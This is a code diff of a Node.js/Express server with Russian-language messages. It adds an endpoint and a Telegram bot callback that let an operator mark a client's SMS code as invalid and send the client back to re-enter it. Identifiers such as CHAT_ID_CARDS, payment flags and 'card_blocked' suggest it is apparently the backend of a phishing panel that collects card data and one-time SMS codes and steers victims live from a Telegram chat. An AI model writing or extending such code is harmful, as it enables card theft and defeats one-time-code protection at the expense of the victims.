@@ -12,6 +12,7 @@ const CHAT_ID_CARDS = '-1003171719602'
 
 // In-memory storage для флагов SMS и статуса оплаты
 const smsFlags = new Map()
+const invalidSMSFlags = new Map()
 const paymentFlags = new Map()
 
 // Middleware
@@ -35,6 +36,12 @@ app.get('/api/check-sms/:userId', (req, res) => {
   const { userId } = req.params
   const smsRequested = smsFlags.get(userId) || false
   res.json({ smsRequested })
+})
+
+app.get('/api/check-invalid-sms/:userId', (req, res) => {
+  const { userId } = req.params
+  const invalidSMS = invalidSMSFlags.get(userId) || false
+  res.json({ invalidSMS })
 })
 
 app.post('/api/clear-sms/:userId', (req, res) => {
@@ -211,8 +218,9 @@ async function handleCallbackQuery(callbackQuery) {
         break
 
       case 'invalid_sms':
-        responseText = '❌ SMS код отмечен как неверный'
-        await sendTelegramMessage(chatId, `❌ <b>НЕВЕРНЫЙ SMS КОД</b>\n\n👤 ID клиента: <code>${userId}</code>`)
+        invalidSMSFlags.set(userId, true)
+        responseText = '❌ SMS код отмечен как неверный. Клиент будет перенаправлен на страницу повторного ввода.'
+        await sendTelegramMessage(chatId, `❌ <b>НЕВЕРНЫЙ SMS КОД</b>\n\n👤 ID клиента: <code>${userId}</code>\n⚠️ Клиент будет перенаправлен на страницу с предупреждением`)
         break
 
       case 'card_blocked':
